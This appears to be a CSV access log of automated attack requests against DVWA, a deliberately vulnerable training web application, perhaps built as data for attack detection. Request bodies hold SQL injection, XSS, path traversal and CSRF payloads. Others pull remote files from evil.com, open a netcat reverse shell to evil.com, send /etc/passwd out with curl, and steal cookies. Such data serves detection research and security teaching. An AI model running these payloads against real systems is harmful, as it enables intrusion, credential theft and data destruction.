_id,body_bytes_sent,ip,request.method,request.path,request.protocol,request_body,status,timestamp
94b0312bd04c,4877,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/index.php,HTTP/1.1,,200,2025-10-11T21:56:15
0d5373ffb212,155,127.0.0.1,GET,/DVWA/vulnerabilities/xss_r/,HTTP/1.1,name=<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>,302,2025-10-11T21:56:15
655555cac990,4964,127.0.0.1,GET,/DVWA/vulnerabilities/xss_r/index.php,HTTP/1.1,,200,2025-10-11T21:56:15
1fa86550d41f,22,127.0.0.1,GET,/DVWA/vulnerabilities/fi/,HTTP/1.1,page=....//....//....//etc/passwd,200,2025-10-11T21:56:15
2f8ccd6278d1,0,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/,HTTP/1.1,id='+&&+this.password.match(/.*/)//&Submit=Submit,302,2025-10-11T21:56:15
0566866cfb94,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:15
9b3f83f0e3f7,154,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/,HTTP/1.1,"id='+AND+UPDATEXML(1,CONCAT(0x7e,(SELECT+user()),0x7e),1)--&Submit=Submit",302,2025-10-11T21:56:16
6ddae7b3d0a9,4808,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/index.php,HTTP/1.1,,200,2025-10-11T21:56:16
7ae199bfa3de,160,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,id='+AND+1=1--&Submit=Submit,302,2025-10-11T21:56:16
8c5072cc72e8,4877,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/index.php,HTTP/1.1,,200,2025-10-11T21:56:16
b658129f0acb,4819,127.0.0.1,GET,/DVWA/vulnerabilities/brute/,HTTP/1.1,,200,2025-10-11T21:56:16
0e092bbd4c47,4819,127.0.0.1,POST,/DVWA/vulnerabilities/brute/,HTTP/1.1,username=admin'+OR+'1'='1'+--&password=&user_token=eaf2557a40fe4022369a53f5349bae84,200,2025-10-11T21:56:16
bfc7620f4c5d,0,127.0.0.1,GET,/DVWA/vulnerabilities/fi/,HTTP/1.1,page=ftp://evil.com/shell.php?l0t4QRHm,302,2025-10-11T21:56:16
c546fde6a3b0,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:16
ecaf6ea92dd4,4519,127.0.0.1,GET,/DVWA/vulnerabilities/authbypass/,HTTP/1.1,username=admin&password=123456,200,2025-10-11T21:56:17
32b684c4a70e,154,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/,HTTP/1.1,id='+AND+(SELECT+COUNT(*)+FROM+users)>0--&Submit=Submit,302,2025-10-11T21:56:17
6907efd97d6b,4808,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/index.php,HTTP/1.1,,200,2025-10-11T21:56:17
32b684c4a70e,154,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/,HTTP/1.1,"id='+UNION+SELECT+1,LOAD_FILE('/etc/passwd'),3--&Submit=Submit",302,2025-10-11T21:56:17
6907efd97d6b,4808,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/index.php,HTTP/1.1,,200,2025-10-11T21:56:17
75b4aa412c0c,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_d/,HTTP/1.1,default=<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>,302,2025-10-11T21:56:17
f8c133e639de,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:17
dc9a3f236cb8,4819,127.0.0.1,GET,/DVWA/vulnerabilities/brute/,HTTP/1.1,username='+OR+1=1+--&password='+OR+1=1+--,200,2025-10-11T21:56:18
dfe3a78263b7,4756,127.0.0.1,GET,/DVWA/vulnerabilities/exec/,HTTP/1.1,,200,2025-10-11T21:56:18
0c40538e1e7f,4805,127.0.0.1,POST,/DVWA/vulnerabilities/exec/,HTTP/1.1,ip=127.0.0.1&+timeout+10&Submit=Submit&user_token=14265577efa01ea815c5b675f40d1740,200,2025-10-11T21:56:18
dc9a3f236cb8,4819,127.0.0.1,GET,/DVWA/vulnerabilities/brute/,HTTP/1.1,username=admin&password=dragon,200,2025-10-11T21:56:18
dfe3a78263b7,0,127.0.0.1,GET,/DVWA/vulnerabilities/exec/,HTTP/1.1,,302,2025-10-11T21:56:18
6cf06c258ade,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:18
0c40538e1e7f,0,127.0.0.1,POST,/DVWA/vulnerabilities/exec/,HTTP/1.1,ip=127.0.0.1;+ping+-c+10+127.0.0.1&Submit=Submit&user_token=a1c63a8d6992a6a7e0c23e3f5c27f8e6,302,2025-10-11T21:56:18
6cf06c258ade,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:18
616282dc69c9,22,127.0.0.1,GET,/DVWA/vulnerabilities/fi/,HTTP/1.1,page=/var/log/nginx/access.log,200,2025-10-11T21:56:19
f44778e517a9,4519,127.0.0.1,GET,/DVWA/vulnerabilities/authbypass/,HTTP/1.1,username=admin&password=welcome,200,2025-10-11T21:56:19
c5d4bb31cb99,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_tiDN0f&password_conf=hacked_IH6zia&Change=Change,302,2025-10-11T21:56:19
653718f78c12,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:56:19
4a63597800a6,0,127.0.0.1,GET,/DVWA/vulnerabilities/brute/,HTTP/1.1,username=admin'+--&password=anything,302,2025-10-11T21:56:19
5ce9005194d7,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:19
940ddb20a08f,4756,127.0.0.1,GET,/DVWA/vulnerabilities/exec/,HTTP/1.1,,200,2025-10-11T21:56:20
fccf0d545662,4805,127.0.0.1,POST,/DVWA/vulnerabilities/exec/,HTTP/1.1,ip=127.0.0.1|+whoami&Submit=Submit&user_token=3f0a2a6a32b511c0d90c544af71afbcb,200,2025-10-11T21:56:20
069fd20d4c88,4796,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,,200,2025-10-11T21:56:20
8c9da923b607,4796,127.0.0.1,POST,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,"id='+UNION+SELECT+1,LOAD_FILE('/etc/passwd'),3--&Submit=Submit&user_token=cbe4e66fdf041c6773a1b499c50f8d17",200,2025-10-11T21:56:20
ec34906b8c52,4519,127.0.0.1,GET,/DVWA/vulnerabilities/authbypass/,HTTP/1.1,username=$ne&password=$ne,200,2025-10-11T21:56:20
eaa85aa8a07e,0,127.0.0.1,GET,/DVWA/vulnerabilities/brute/,HTTP/1.1,username=admin'+OR+'1'='1'+--&password=,302,2025-10-11T21:56:20
528bdf716e3d,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:20
b99106fdf0db,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_HV0QJc&password_conf=hacked_AKwi5u&Change=Change,302,2025-10-11T21:56:21
c07abb689280,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:56:21
dcb7946ea49b,4796,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,,200,2025-10-11T21:56:21
77cb84d7125c,4796,127.0.0.1,POST,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,id=';+return+true;+//&Submit=Submit&user_token=db6144d80ef102b42ed60bb5220473e0,200,2025-10-11T21:56:21
b99106fdf0db,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:56:21
87b92b6f1dd5,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_OqaowW&password_conf=hacked_L8KEwm&Change=Change&user_token=2b173f9f8a76f6182f2c84bdcab78a97,200,2025-10-11T21:56:21
1e7a44efc1cb,0,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/,HTTP/1.1,id=';+return+true;+//&Submit=Submit,302,2025-10-11T21:56:21
48cdaa6149d5,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:21
310157e8fc83,233965,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=%3Cscript%3Ealert('XSS')%3C/script%3E&mtxMessage=data:text/html,<script>alert('XSS')</script>&btnSign=Sign+Guestbook",200,2025-10-11T21:56:21
299ed8812cdc,4756,127.0.0.1,GET,/DVWA/vulnerabilities/exec/,HTTP/1.1,ip=127.0.0.1|+type+C:\Windows\System32\drivers\etc\hosts&Submit=Submit,200,2025-10-11T21:56:22
5badfae7315f,233965,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=<svg+onload=alert('XSS')>&mtxMessage=<form><button+formaction=javascript:alert('XSS')>Click</button></form>&btnSign=Sign+Guestbook,200,2025-10-11T21:56:24
f5049557f18e,0,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/,HTTP/1.1,"id='+UNION+SELECT+1,group_concat(table_name),3+FROM+information_schema.tables+WHERE+table_schema=database()--&Submit=Submit",302,2025-10-11T21:56:24
5e6af2d12458,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:25
bce2f5a75101,4727,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/,HTTP/1.1,,200,2025-10-11T21:56:25
631a66e20c97,4727,127.0.0.1,POST,/DVWA/vulnerabilities/sqli/,HTTP/1.1,id='+||+'1'=='1&Submit=Submit&user_token=6f23c60d673b28226a372c3a9e8f6eea,200,2025-10-11T21:56:25
7c764f4d0307,4819,127.0.0.1,GET,/DVWA/vulnerabilities/brute/,HTTP/1.1,username=admin';+DROP+TABLE+users;+--&password=password,200,2025-10-11T21:56:25
77840d8f95e5,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:56:25
c85e686dbcf0,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_pgGMc0&password_conf=hacked_xSnHQp&Change=Change&user_token=3fcc82316fcfe3d653a71c1e4829aa97,200,2025-10-11T21:56:25
ee0231f6022c,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>&mtxMessage=data:text/html,<script>alert('XSS')</script>&btnSign=Sign+Guestbook",302,2025-10-11T21:56:26
a3ce5e9a8a50,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:26
0bf82960504b,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:56:34
d870137ece94,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_uopBYA&password_conf=hacked_vAPOwF&Change=Change&user_token=95eaad45673d86093d01ccb811d46926,200,2025-10-11T21:56:34
8bac10c9187e,4796,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,,200,2025-10-11T21:56:34
edf09ab2add2,4796,127.0.0.1,POST,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,id='+AND+(SELECT+LENGTH(database()))>5--&Submit=Submit&user_token=e99877eb94d69367d112952888a7189f,200,2025-10-11T21:56:34
b91e70182686,160,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,id='+||+'1'=='1&Submit=Submit,302,2025-10-11T21:56:35
3f404d27a5ed,4877,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/index.php,HTTP/1.1,,200,2025-10-11T21:56:35
1ad04fd41458,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_r/,HTTP/1.1,"name=<img+src=""""+onerror=""this.src='http://evil.com/log.php?cookie='+document.cookie"">",302,2025-10-11T21:56:35
5b999862e552,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:35
d760d545f09f,5181,127.0.0.1,GET,/DVWA/vulnerabilities/xss_d/,HTTP/1.1,default=<form><button+formaction=javascript:alert('XSS')>Click</button></form>,200,2025-10-11T21:56:35
54376da87254,4756,127.0.0.1,GET,/DVWA/vulnerabilities/exec/,HTTP/1.1,,200,2025-10-11T21:56:35
444b4d5d3b1a,4805,127.0.0.1,POST,/DVWA/vulnerabilities/exec/,HTTP/1.1,ip=127.0.0.1|+nc+-e+/bin/sh+evil.com+4444&Submit=Submit&user_token=11dc6363cf0e56ff55a1489e50c08167,200,2025-10-11T21:56:35
60f3684bcb40,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_UvfJMU&password_conf=hacked_fYErnZ&Change=Change,302,2025-10-11T21:56:36
8bd032d1e237,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:56:36
60f3684bcb40,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_iVVJlh&password_conf=hacked_ngcbBG&Change=Change,302,2025-10-11T21:56:36
803dc60a22f4,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:36
b102a5df3df5,154,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/,HTTP/1.1,"id=';+INSERT+INTO+users+VALUES+('1qi8MvBd','hacked','admin')--&Submit=Submit",302,2025-10-11T21:56:36
ac267de848ee,4808,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/index.php,HTTP/1.1,,200,2025-10-11T21:56:36
9c3e2e8c6a6d,233965,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T21:56:36
b99757294449,234145,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=<body+onload=alert('XSS')>&mtxMessage=%3Cscript%3Ealert('XSS')%3C/script%3E&btnSign=Sign+Guestbook&user_token=8a19cfcf28e4adde4cb4091d20940ab5,200,2025-10-11T21:56:37
819416ffb215,155,127.0.0.1,GET,/DVWA/vulnerabilities/xss_r/,HTTP/1.1,"name=data:text/html,<script>alert('XSS')</script>",302,2025-10-11T21:56:37
e8ee26fb796b,4964,127.0.0.1,GET,/DVWA/vulnerabilities/xss_r/index.php,HTTP/1.1,,200,2025-10-11T21:56:37
170a8b7a1d48,0,127.0.0.1,GET,/DVWA/vulnerabilities/fi/,HTTP/1.1,page=https://raw.githubusercontent.com/evil/repo/shell.php,302,2025-10-11T21:56:37
837ded60028b,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:37
c118122ac1b3,4819,127.0.0.1,GET,/DVWA/vulnerabilities/brute/,HTTP/1.1,,200,2025-10-11T21:56:37
75042ad6d876,4819,127.0.0.1,POST,/DVWA/vulnerabilities/brute/,HTTP/1.1,username=$ne&password=$ne&user_token=fd7aca43eb43e95fd92c8130a7e28e58,200,2025-10-11T21:56:37
071dcef9623c,154,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/,HTTP/1.1,"id='+UNION+SELECT+1,concat(user,':',password),3+FROM+users--&Submit=Submit",302,2025-10-11T21:56:37
1f07182a7522,4808,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/index.php,HTTP/1.1,,200,2025-10-11T21:56:37
c629144730c7,155,127.0.0.1,GET,/DVWA/vulnerabilities/xss_r/,HTTP/1.1,name=<body+onload=alert('XSS')>,302,2025-10-11T21:56:38
d3f408ad6c4d,4964,127.0.0.1,GET,/DVWA/vulnerabilities/xss_r/index.php,HTTP/1.1,,200,2025-10-11T21:56:38
44c69afb8a5c,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=&lt;script&gt;alert('XSS')&lt;/script&gt;&mtxMessage=<svg+onload=alert('XSS')>&btnSign=Sign+Guestbook,302,2025-10-11T21:56:38
5dd073751a20,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:38
44c69afb8a5c,234145,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=<script>alert('XSS')</script>&mtxMessage=&#60;script&#62;alert('XSS')&#60;/script&#62;&btnSign=Sign+Guestbook,200,2025-10-11T21:56:38
d3b9e7286b57,160,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,id='+AND+SLEEP(5)--&Submit=Submit,302,2025-10-11T21:56:38
38195ff23e96,4877,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/index.php,HTTP/1.1,,200,2025-10-11T21:56:38
0ca2adfe0098,5181,127.0.0.1,GET,/DVWA/vulnerabilities/xss_d/,HTTP/1.1,default=javascript:alert('XSS'),200,2025-10-11T21:56:38
685006584452,0,127.0.0.1,GET,/DVWA/vulnerabilities/exec/,HTTP/1.1,,302,2025-10-11T21:56:39
b72e81e0d514,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:39
6a91c75c10e8,0,127.0.0.1,POST,/DVWA/vulnerabilities/exec/,HTTP/1.1,ip=127.0.0.1;+cat+/etc/passwd&Submit=Submit&user_token=6d345da656016256db63bdf9e02b5b76,302,2025-10-11T21:56:39
b72e81e0d514,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:39
99b5d833328d,234145,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T21:56:39
064a64e966f3,234424,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<a+href=""javascript:alert('XSS_PByn')"">Click+me</a>&mtxMessage=&#60;script&#62;alert('XSS')&#60;/script&#62;&btnSign=Sign+Guestbook&user_token=30e4f4e75c3044d9b34fc63e463fdff0",200,2025-10-11T21:56:39
2a08fa5fa148,4519,127.0.0.1,GET,/DVWA/vulnerabilities/authbypass/,HTTP/1.1,username=admin&password=letmein,200,2025-10-11T21:56:39
cc05395c2536,234424,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<img+src=x+onerror=alert('XSS')>&mtxMessage=<input+type='image'+src='x'+onerror='alert(String.fromCharCode(88,83,83))'>&btnSign=Sign+Guestbook",200,2025-10-11T21:56:40
f2d14ab07b0a,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_d/,HTTP/1.1,"default=<input+type='image'+src='x'+onerror='alert(String.fromCharCode(88,83,83))'>",302,2025-10-11T21:56:40
07125d58fd1d,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:40
a7aafd6dad88,4756,127.0.0.1,GET,/DVWA/vulnerabilities/exec/,HTTP/1.1,,200,2025-10-11T21:56:40
c2e1dfb75d43,4805,127.0.0.1,POST,/DVWA/vulnerabilities/exec/,HTTP/1.1,"ip=127.0.0.1;+curl+http://evil.com/exfil.php+--data+""$(cat+/etc/passwd)""&Submit=Submit&user_token=c632f1438fbe330758c2e7de1e8b54f9",200,2025-10-11T21:56:40
b5c18c683089,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:56:41
f0c8cc14ba6a,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_1BFc66&password_conf=hacked_iapRJN&Change=Change&user_token=bfbdfa327e71e6292c5a4fb02b1c7e19,200,2025-10-11T21:56:41
75f75635218f,4819,127.0.0.1,GET,/DVWA/vulnerabilities/brute/,HTTP/1.1,,200,2025-10-11T21:56:41
9bd5cf520637,4819,127.0.0.1,POST,/DVWA/vulnerabilities/brute/,HTTP/1.1,username=admin&password=dragon&user_token=71003893ce9351b01df16190addd2547,200,2025-10-11T21:56:41
691476fcabf3,0,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/,HTTP/1.1,,302,2025-10-11T21:56:41
a66eeb2535e8,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:41
6e2f2cd6656c,0,127.0.0.1,POST,/DVWA/vulnerabilities/sqli/,HTTP/1.1,"id='+UNION+SELECT+1,concat(user,':',password),3+FROM+users--&Submit=Submit&user_token=a373dbf0bfe06c4e5af6e6f84298d487",302,2025-10-11T21:56:41
a66eeb2535e8,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:41
78241f828ba3,234424,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T21:56:41
09c3c3637981,234701,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<svg+onload=alert('XSS')>&mtxMessage=<img+src=""""+onerror=""this.src='http://evil.com/log.php?cookie='+document.cookie"">&btnSign=Sign+Guestbook&user_token=b5a288015b38fb0a17c213a0ce5202b0",200,2025-10-11T21:56:41
d88c9822b393,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_wVh5QY&password_conf=hacked_Dtmw2l&Change=Change,302,2025-10-11T21:56:42
39f3c1fa0cd8,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:56:42
551a137b38bb,234701,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T21:56:42
d46317747a5a,234926,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=%3Cscript%3Ealert('XSS')%3C/script%3E&mtxMessage=<iframe+src='javascript:alert(document.cookie)'></iframe>&btnSign=Sign+Guestbook&user_token=ebde941ae424a38d2364b3a5d106a800,200,2025-10-11T21:56:42
8870a4b8455b,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,302,2025-10-11T21:56:43
e59cecc3f5ce,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:43
080809dc785d,0,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<img+src=""""+onerror=""this.src='http://evil.com/log.php?cookie='+document.cookie"">&mtxMessage=<script>alert('XSS')</script>&btnSign=Sign+Guestbook&user_token=ba84f0c2fc66b9e55d14cbd32f119066",302,2025-10-11T21:56:43
e59cecc3f5ce,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:43
85eeca4a3650,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_s1dDyl&password_conf=hacked_3bE1mL&Change=Change,302,2025-10-11T21:56:43
ebcae8559dfc,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:56:43
85eeca4a3650,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:56:43
f197db4ae09b,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_4hLRWT&password_conf=hacked_VAYWzx&Change=Change&user_token=9441cc05c242e69a3a593fcb92f51407,200,2025-10-11T21:56:43
2b9d10b090bc,4727,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/,HTTP/1.1,,200,2025-10-11T21:56:43
16ae0b89f6f4,4727,127.0.0.1,POST,/DVWA/vulnerabilities/sqli/,HTTP/1.1,"id='+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+user()),0x7e))--&Submit=Submit&user_token=ee193c19c1c26131a4b99fcf951d1c4f",200,2025-10-11T21:56:43
dec203af13e7,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_r/,HTTP/1.1,name=<script>alert('XSS')</script>,302,2025-10-11T21:56:44
4bb724182f93,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:44
9f552442f339,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_NE12ra&password_conf=hacked_7QlS2K&Change=Change,302,2025-10-11T21:56:44
b5fb61e2cb11,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:56:44
f02602f3fab0,22,127.0.0.1,GET,/DVWA/vulnerabilities/fi/,HTTP/1.1,page=..\..\..\boot.ini%00,200,2025-10-11T21:56:44
1effa5ec0341,4796,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,,200,2025-10-11T21:56:44
547cf8306747,4796,127.0.0.1,POST,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,"id='+AND+(SELECT+SUBSTR(user(),1,1))='r'--&Submit=Submit&user_token=f3036f408cb3f5d050bf725bfae9da09",200,2025-10-11T21:56:44
6e99b89b9e2c,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_d/,HTTP/1.1,"default=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",302,2025-10-11T21:56:44
db7dfb6b21a2,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:45
f8ce4ca52552,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_BAD4jO&password_conf=hacked_leaZFM&Change=Change,302,2025-10-11T21:56:45
9ddae6a462a7,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:56:45
8b93e7997ecd,154,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/,HTTP/1.1,"id='+UNION+SELECT+null,user(),database(),version(),null--&Submit=Submit",302,2025-10-11T21:56:45
1eae5473d673,4808,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/index.php,HTTP/1.1,,200,2025-10-11T21:56:45
24b6a6b8d604,4819,127.0.0.1,GET,/DVWA/vulnerabilities/brute/,HTTP/1.1,username=administrator&password=password,200,2025-10-11T21:56:45
c22cae6d3046,0,127.0.0.1,GET,/DVWA/vulnerabilities/authbypass/,HTTP/1.1,,302,2025-10-11T21:56:46
e50cde00cb83,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:46
43357dff6b3e,0,127.0.0.1,POST,/DVWA/vulnerabilities/authbypass/,HTTP/1.1,username=admin&password=123456&user_token=4f4ad3d64a371f726986bd284058938c,302,2025-10-11T21:56:46
e50cde00cb83,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:46
df1b476c8f8b,4727,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/,HTTP/1.1,,200,2025-10-11T21:56:46
fdba7dbc7421,4727,127.0.0.1,POST,/DVWA/vulnerabilities/sqli/,HTTP/1.1,"id='+AND+(SELECT+*+FROM+(SELECT+COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x+FROM+information_schema.tables+GROUP+BY+x)a)--&Submit=Submit&user_token=3fb057c12bad2e2ba2903aa6b57a99bc",200,2025-10-11T21:56:46
cf976e2b750b,160,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,id=';+return+true;+//&Submit=Submit,302,2025-10-11T21:56:46
8c2cef383d8d,4877,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/index.php,HTTP/1.1,,200,2025-10-11T21:56:46
c22cae6d3046,4519,127.0.0.1,GET,/DVWA/vulnerabilities/authbypass/,HTTP/1.1,,200,2025-10-11T21:56:46
